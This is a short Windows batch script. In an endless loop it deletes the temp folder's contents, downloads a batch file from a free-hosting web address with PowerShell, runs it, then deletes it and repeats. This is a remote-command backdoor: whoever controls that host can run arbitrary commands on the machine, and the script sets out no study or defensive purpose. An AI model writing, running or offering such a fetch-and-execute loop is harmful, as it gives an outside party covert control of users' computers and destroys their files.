@echo off
:Start
del /f /q %temp%\*
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Invoke-WebRequest http://blazenet.000webhostapp.com/backend/devreq2.txt -OutFile devreqcom.bat
devreqcom.bat
timeout
del devreqcom.bat
goto Start